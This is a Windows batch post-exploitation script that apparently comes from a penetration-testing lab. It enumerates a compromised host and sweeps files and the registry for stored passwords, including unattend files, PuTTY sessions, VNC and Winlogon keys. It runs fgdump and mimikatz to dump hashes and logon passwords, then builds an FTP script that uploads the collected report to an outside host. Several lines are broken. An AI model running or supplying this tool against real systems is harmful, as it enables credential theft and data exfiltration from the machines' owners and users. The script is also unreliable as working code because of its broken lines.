:: this is a script that should be ran twice: once you have a limited shell, then again when you have a privileged shell. Reason being is you'll have access to additional directories and will be able to dump passwords/hashes.
:: Note this script has depedencies:
:: needs:
:: accesschk.exe
:: accesschk_xp.exe
:: fgdump.exe
:: mimikatz-64.exe
:: mimikatz-86.exe

@echo OFF


::wget.vbs http://10.11.0.215/accesschk.exe accesschk.exe

::wget.vbs http://10.11.0.215/accesschk_xp.exe accesschk_xp.exe


echo Performing step 0

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Loot!!! >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul

for %c in (C, D, E, F, G, H) do @(for /F "delims=!" %i in ('dir /s /b %c:\proof.txt') do echo. && echo "%i" && echo "((START))" && type "%i" && echo. && echo "((END))") >> report.txt 2>nul
for %c in (C, D, E, F, G, H) do @(for /F "delims=!" %i in ('dir /s /b %c:\network-secrets.txt') do echo. && echo "%i" && echo "((START))" && type "%i" && echo. && echo "((END))") >> report.txt 2>nul

::Based on Windows Privilege Escalation Fundamentals http://www.fuzzysecurity.com/tutorials/16.html
echo Performing step 1
echo "Local Windows Enumeration & Privilege Escalation checks by Mattia Reggiani, edited by Adam Nadrowski" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] System Info >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd systeminfo:  >> report.txt 2> nul
systeminfo >> report.txt 2>nul
echo RUnning cmd ver:  >> report.txt 2> nul
ver >> report.txt 2>nul
echo Running cmd hostname:  >> report.txt 2> nul
hostname >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.1

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Current user >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd whoami:  >> report.txt 2> nul
whoami >> report.txt 2>nul
echo Running cmd username:  >> report.txt 2> nul
echo %username% >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.2

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Users >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd net localgroup:  >> report.txt 2> nul
net localgroup >> report.txt 2>nul
echo Running cmd net localgroup administrators: >> report.txt 2> nul
net localgroup administrators >> report.txt 2>nul
echo Running cmd qusers:  >> report.txt 2> nul
qusers >> report.txt 2>nul
echo Running cmd qwinsta:  >> report.txt 2> nul
qwinsta >> report.txt 2>nul
echo running cmd net users:  >> report.txt 2> nul
net users >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.3

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Interesting files 1>> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo This is c:\boot.ini:  >> report.txt 2> nul
more c:\boot.ini >> report.txt 2>nul
echo This is etc hosts:  >> report.txt 2> nul
more C:\WINDOWS\System32\drivers\etc\hosts >> report.txt 2>nul
echo This is etc networks:  >> report.txt 2> nul
more C:\WINDOWS\System32\drivers\etc\networks >> report.txt 2>nul
echo This is Appdata\Local\Temp (win7):  >> report.txt 2> nul
more "C:\Users\%username%\AppData\Local\Temp" >> report.txt 2>nul
echo This is Application Data (xp): >> report.txt 2>nul
more "C:\Documents and Settings\%username%\Application Data\" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo "" >> report.txt 2>nul

echo checkpoint 1.4

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Environment vars 1>> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd path: >> report.txt 2>nul
path >> report.txt 2>nul
echo echoing path env variable: >> report.txt 2>nul
echo %path% >> report.txt 2>nul
echo Running cmd set: >> report.txt 2>nul
set >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.5

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Networking >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd ipconfig /all: >> report.txt 2>nul
ipconfig /all >> report.txt 2>nul
echo Running ipconfig /displaydns >> report.txt 2>nul
ipconfig /displaydns >> report.txt 2>nul
echo Running route print: >> report.txt 2>nul
route print >> report.txt 2>nul
echo Running arp -A: >> report.txt 2>nul
arp -A >> report.txt 2>nul
echo Running netstat -na to see systems recently communicated with this host>> report.txt 2>nul
netstat -na >> report.txt 2>nul
echo Running netstat -ano: >> report.txt 2>nul
netstat -ano >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo "" >> report.txt 2>nul

echo checkpoint 1.6

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Firewalling >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd firewall show state: >> report.txt 2>nul
netsh firewall show state >> report.txt 2>nul
echo Running cmd netsh firewall show config: >> report.txt 2>nul
netsh firewall show config >> report.txt 2>nul
echo Running cmd netsh dump: >> report.txt 2>nul
netsh dump >> report.txt 2>nul
echo Running cmd netsh advfirewall firewall show rule name=all verbose: >> report.txt 2>nul
netsh advfirewall firewall show rule name=all verbose >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.7

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Domain >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd set userdomain: >> report.txt 2>nul
set userdomain >> report.txt 2>nul
echo Running cmd net view /domain: >> report.txt 2>nul
net view /domain >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.8

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Scheduled Tasks 1>> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running schtasks /query /fo LIST /v: >> report.txt 2>nul
schtasks /query /fo LIST /v >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.9

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Running Tasks >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running cmd tasklist /SVC: >> report.txt 2>nul
tasklist /SVC >> report.txt 2>nul
echo Running cmd tasklist /m >> report.txt 2>nul
tasklist /m >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.10

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Tasks started >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running net start: >> report.txt 2>nul
net start >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.11

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Software installed >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running qprocess: >> report.txt 2>nul
qprocess >> report.txt 2>nul
echo Running driverquery /v: >> report.txt 2>nul
driverquery /v >> report.txt 2>nul
echo Running assoc: >> report.txt 2>nul
assoc >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.12

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] File System Inventory >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running dir /a /s /b c:\*.pdf* to find all PDF files: >> report.txt 2>nul
dir /a /s /b c:\*.pdf* >> report.txt 2>nul
echo.
echo Running dir /a /b c:\windows\kb* to find installed patches: >> report.txt 2>nul
echo dir /a /b c:\windows\kb* >> report.txt 2>nul
echo.
echo Running dir /s c:\ >> report.txt 2>nul
dir /s c:\ >> report.txt 2>nul
echo.
echo Running findstr /si password *.txt *.xml *.xsl* *.doc *.db* >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.13

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Services >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running sc query: >> report.txt 2>nul
sc query >> report.txt 2>nul
echo Running sc query state= all: >> report.txt 2>nul
sc query state= all >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.14

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Hardware 1>> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running DRIVERQUERY: >> report.txt 2>nul
DRIVERQUERY >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.15

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Config files >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running dir /s *pass* == *cred* == *vnc* == *.config*: >> report.txt 2>nul
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt 2>nul
echo findstr /si password *.xml *.ini *.txt >> report.txt 2>nul
findstr /si password *.xml *.ini *.txt >> report.txt 2>nul
echo findstr /si pass *.xml *.ini *.txt >> report.txt 2>nul
findstr /si pass *.xml *.ini *.txt >> report.txt 2>nul
echo reg query HKLM /f password /t REG_SZ /s /reg:64 >> report.txt 2>nul
reg query HKLM /f password /t REG_SZ /s /reg:64 >> report.txt 2>nul
echo reg query HKCU /f password /t REG_SZ /s /reg:64 >> report.txt 2>nul
reg query HKCU /f password /t REG_SZ /s /reg:64 >> report.txt 2>nul
echo type c:\sysprep.inf >> report.txt 2>nul
type c:\sysprep.inf >> report.txt 2>nul
echo type c:\sysprep\sysprep.xml >> report.txt 2>nul
type c:\sysprep\sysprep.xml >> report.txt 2>nul
echo type %WINDIR%\Panther\Unattend\Unattended.xml >> report.txt 2>nul
type %WINDIR%\Panther\Unattend\Unattended.xml >> report.txt 2>nul
echo type %WINDIR%\Panther\Unattended.xml >> report.txt 2>nul
type %WINDIR%\Panther\Unattended.xml >> report.txt 2>nul
echo type Services\Services.xml >> report.txt 2>nul
type Services\Services.xml >> report.txt 2>nul
echo type ScheduledTasks\ScheduledTasks.xml >> report.txt 2>nul
type ScheduledTasks\ScheduledTasks.xml >> report.txt 2>nul
echo type Printers\Printers.xml >> report.txt 2>nul
type Printers\Printers.xml >> report.txt 2>nul
echo type Drives\Drives.xml >> report.txt 2>nul
type Drives\Drives.xml >> report.txt 2>nul
echo type DataSources\DataSources.xml >> report.txt 2>nul
type DataSources\DataSources.xml >> report.txt 2>nul
echo reg query "HKCU\Software\ORL\WinVNC3\Password" /reg:64 >> report.txt 2>nul
reg query "HKCU\Software\ORL\WinVNC3\Password" /reg:64 >> report.txt 2>nul
echo reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 >> report.txt 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 >> report.txt 2>nul
echo reg query" HKCU\Software\SimonTatham\PuTTY\Sessions" /reg:64 >> report.txt 2>nul
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions" /reg:64 >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.16

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Checking AlwaysInstallElevated >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /reg:64 >> report.txt 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /reg:64 >> report.txt 2>nul
echo reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /reg:64 >> report.txt 2>nul
echo reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /reg:64 >> report.txt 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /reg:64 >> report.txt 2>nul
echo reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /reg:64 >> report.txt 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /reg:64 >> report.txt 2>nul
echo reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /reg:64 >> report.txt 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /reg:64 >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.17

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Find weak directories >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo accesschk.exe /accepteula -uwdqs users c:\ >> report.txt 2>nul
accesschk.exe /accepteula -uwdqs users c:\ >> report.txt 2>nul
echo accesschk.exe -uwdqs "Authenticated Users" c:\ >> report.txt 2>nul
accesschk.exe -uwdqs "Authenticated Users" c:\ >> report.txt 2>nul
echo accesschk_xp.exe /accepteula -uwdqs users c:\ >> report.txt 2>nul
accesschk_xp.exe /accepteula -uwdqs users c:\ >> report.txt 2>nul
echo accesschk_xp.exe -uwdqs "Authenticated Users" c:\ >> report.txt 2>nul
accesschk_xp.exe -uwdqs "Authenticated Users" c:\ >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 1.18

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Find weak files >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo accesschk.exe -uwqs users c:\*.* >> report.txt 2>nul
accesschk.exe -uwqs users c:\*.* >> report.txt 2>nul
echo accesschk.exe -uwqs "Authenticated Users" c:\*.* >> report.txt 2>nul
accesschk.exe -uwqs "Authenticated Users" c:\*.* >> report.txt 2>nul
echo accesschk_xp.exe -uwqs users c:\*.* >> report.txt 2>nul
accesschk_xp.exe -uwqs users c:\*.* >> report.txt 2>nul
echo accesschk_xp.exe -uwqs "Authenticated Users" c:\*.* >> report.txt 2>nul
accesschk_xp.exe -uwqs "Authenticated Users" c:\*.* >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

::cacls "c:\Program Files" /T | findstr Users

echo Performing step 2
:: If WMIC is enabled
echo "Local Windows Enumeration & Privilege Escalation checks by Mattia Reggiani, edited by Adam Nadrowski" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] WMIC Zone >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo wmic service list brief /format:table >> report.txt 2>nul
wmic service list brief /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic service list config /format:table >> report.txt 2>nul
wmic service list config /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic process get CSName,Description,ExecutablePath,ProcessId /format:table >> report.txt 2>nul
wmic process get CSName,Description,ExecutablePath,ProcessId /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:table >> report.txt 2>nul
wmic process get CSName,Description,ExecutablePath,ProcessId /format:table >> report.txt 2>nul

echo checkpoint 2

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic USERACCOUNT list full /format:table >> report.txt 2>nul
wmic USERACCOUNT list full /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic group list full /format:table >> report.txt 2>nul
wmic group list full /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:table >> report.txt 2>nul
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:table >> report.txt 2>nul
wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul

echo checkpoint 2.1

echo. >> report.txt 2>nul
echo wmic netuse list full /format:table >> report.txt 2>nul
wmic netuse list full /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo Installed patches (qfe): >> report.txt 2>nul
echo wmic qfe get Caption,Description,HotFixID,InstalledOn /format:table >> report.txt 2>nul
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic startup get Caption,Command,Location,User /format:table >> report.txt 2>nul
wmic startup get Caption,Command,Location,User /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:table >> report.txt 2>nul
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul

echo checkpoint 2.2

echo. >> report.txt 2>nul
echo wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:table >> report.txt 2>nul
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul
echo wmic Timezone get DaylightName,Description,StandardName /format:table >> report.txt 2>nul
wmic Timezone get DaylightName,Description,StandardName /format:table >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 2.3

echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Registry >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo OS Information: HKLM\Software\Microsoft\Windows NT\Currentversion >> report.txt 2>nul
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo Product Name: HKLM\Software\Microsoft\Windows NT\Currentversion /v ProductName >> report.txt 2>nul
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion" /v ProductName >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

Date of Install: HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate >> report.txt 2>nul
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v InstallDate >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 2.4

echo Registered Owner: HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner >> report.txt 2>nul
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo.

echo SYSTEM ROOT: HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot >> report.txt 2>nul
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v SystemRoot >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo Time Zone (offset in minutes from UTC): HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTimeBias >> report.txt 2>nul
reg query "HKLM\System\CurrentControlSet\Control\TimeZoneinformation" /v ActiveTimeBias >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo checkpoint 2.5

echo Mapped Network Drives: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU >> report.txt 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo Mounted Devices: HKLM\System\MountedDevices >> report.txt 2>nul
reg query "HKLM\System\MountedDevices" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo. >> report.txt 2>nul

echo USB Devices: HKLM\System\CurrentControlSet\Enum\USBStor >> report.txt 2>nul
reg query "HKLM\System\CurrentControlSet\Enum\USBStor" >> report.txt 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo.

echo Performing step 3

:: wget.vbs http://10.11.0.215/fgdump.exe fgdump.exe
:: wget.vbs http://10.11.0.215/mimikatz-64.exe mimikatz-64.exe
:: wget.vbs http://10.11.0.215/mimikatz-86.exe mimikatz-86.exe
checkpoint 3
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo [+] Passwords >> report.txt 2>nul 2>nul
echo --------------------------------------------------------------------------------- >> report.txt 2>nul
echo Running fgdump: >> report.txt 2>nul
fgdump.exe >> report.txt 2>nul
type *pwdump >> report.txt 2>nul

echo checkpoint 3.1

echo Running Mimiatz sekurlsa::logonpasswords >> report.txt 2>nul
mimikatz-64.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> report.txt 2>nul
mimikatz-86.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> report.txt 2>nul

echo checkpoint 3.2

echo Running Mimiatz vault cred >> report.txt 2>nul
mimikatz-64.exe "privilege::debug" "token::elevate" "vault::cred /patch" exit >> report.txt 2>nul
mimikatz-86.exe "privilege::debug" "token::elevate" "vault::cred /patch" exit >> report.txt 2>nul

echo checkpoint 3.3
:: file transfer
echo open $ip> ftpautoupload.txt
echo $user> ftpautoupload.txt
echo $pass>> ftpautoupload.txt
echo ascii>>ftpautoupload.txt
echo put report.txt>> ftpautoupload.txt
echo bye>> ftpautoupload.txt
ftp -s:ftpautoupload.txt

echo Done.

